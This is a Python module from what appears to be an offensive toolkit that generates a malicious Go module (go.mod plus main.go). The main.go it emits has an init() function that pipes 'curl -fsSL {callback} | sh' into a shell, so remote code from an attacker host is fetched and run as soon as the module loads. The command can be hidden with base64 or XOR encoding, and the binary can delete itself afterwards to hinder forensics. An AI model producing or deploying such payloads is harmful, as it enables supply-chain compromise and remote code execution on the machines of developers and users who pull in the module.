"""Generate Go module payload with optional encoding."""
from __future__ import annotations

import base64
import random
from textwrap import dedent
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(cmd.encode()).decode()
        return f"data, _ := base64.StdEncoding.DecodeString(\"{enc}\"); cmd := string(data)"
    if method == "xor":
        key = random.randint(1, 255)
        enc = ",".join(str(ord(c) ^ key) for c in cmd)
        return (
            "var bytes=[]byte{" + enc + "}; "
            f"for i:=0; i<len(bytes); i++{{bytes[i]^={key}}}; "
            "cmd := string(bytes)"
        )
    return f"cmd := \"{cmd}\""


def generate(module: str, callback: str, encode: Optional[str] = None, self_destruct: bool = True) -> str:
    """Return go.mod and main.go payload."""

    encoded = _encode(f"curl -fsSL {callback} | sh", encode)
    main_go = dedent(
        f"""
        package main

        import (
            "os/exec"
            "encoding/base64"
            "os"
        )

        func init() {{
            {encoded}
            exec.Command("sh", "-c", cmd).Run()
            if {str(self_destruct).lower()} {{ os.Remove(os.Args[0]) }}
        }}
        """
    )

    gomod = builder.render("go_mod.go.j2", module_name=module)
    return gomod + "\n" + main_go
